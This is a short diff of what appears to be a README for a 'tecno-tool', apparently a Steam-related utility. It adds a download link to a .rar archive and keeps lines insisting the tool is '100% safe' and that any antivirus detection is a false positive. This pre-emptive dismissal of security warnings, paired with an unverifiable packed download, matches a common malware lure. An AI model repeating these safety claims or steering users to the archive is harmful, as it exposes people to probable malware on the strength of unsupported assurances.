@@ -5,4 +5,4 @@
 > This tool is 100% safe, and anything else is a false positive.
 > Also, it is easier to use than Steam Tools.
 
-
+download from here https://raw.githubusercontent.com/857seif/tecno-tool/refs/heads/main/tecno-tools.rar
